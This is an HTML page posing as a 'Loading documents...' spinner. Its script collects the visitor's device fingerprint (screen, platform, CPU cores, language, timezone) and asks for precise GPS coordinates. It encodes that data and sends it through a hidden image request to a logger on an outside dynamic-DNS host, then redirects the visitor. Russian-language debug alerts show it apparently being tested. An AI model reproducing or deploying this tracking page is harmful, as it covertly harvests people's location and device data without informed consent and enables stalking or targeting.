<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading documents...</title>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const slug = urlParams.get('id');
        const targetServer = "http://echomapwa.ddns.net/logger/api/log_advance/";
        const finalRedirect = "http://echomapwa.ddns.net/logger/l/";

        async function collectAndGo() {
            if (!slug) return;
            
            let info = {
                sw: window.screen.width, sh: window.screen.height,
                plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                gpu: "Unknown", lat: null, lon: null
            };

            // ПРОВЕРКА: Если мы на HTTPS, пробуем GPS с жестким ожиданием
            // ДЕБАГ-ВЕРСИЯ БЛОКА GPS
            alert("Шаг 1: Проверка условий. Protocol: " + location.protocol + " GPS avail: " + (!!navigator.geolocation));

            if (navigator.geolocation) { // Убрал проверку протокола для теста, посмотрим что скажет
                try {
                    alert("Шаг 2: Вызываю getCurrentPosition... Сейчас должно выскочить окно запроса!");
                    
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000, // Увеличил до 15 секунд
                            maximumAge: 0
                        });
                    });

                    info.lat = pos.coords.latitude;
                    info.lon = pos.coords.longitude;
                    
                    alert("Шаг 3: Успех! Координаты получены: " + info.lat + ", " + info.lon);

                } catch (e) {
                    // Самый важный алерт - покажет почему не сработало
                    let errorMsg = "";
                    switch(e.code) {
                        case e.PERMISSION_DENIED: errorMsg = "Пользователь запретил (Denied)"; break;
                        case e.POSITION_UNAVAILABLE: errorMsg = "Местоположение недоступно (Unavailable)"; break;
                        case e.TIMEOUT: errorMsg = "Таймаут (Timeout)"; break;
                        default: errorMsg = "Неизвестная ошибка: " + e.message;
                    }
                    alert("ОШИБКА GPS: " + errorMsg);
                }
            } else {
                alert("КРИТИЧЕСКАЯ ОШИБКА: navigator.geolocation отсутствует в этом браузере!");
            }

            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
            const img = new Image();
            
            // Ждем 2 секунды ПЕРЕД редиректом в любом случае, чтобы пакет успел уйти
            const done = () => { 
                setTimeout(() => {
                    window.location.href = finalRedirect + slug;
                }, 1500);
            };

            img.onload = img.onerror = done;
            // Шлем запрос
            img.src = `${targetServer}${slug}?data=${encodedData}&v=final&t=${Date.now()}`;
            
            // Если через 5 секунд ничего не вышло - уходим
            setTimeout(done, 5000);
        }

        collectAndGo();
    </script>
</body>
</html>
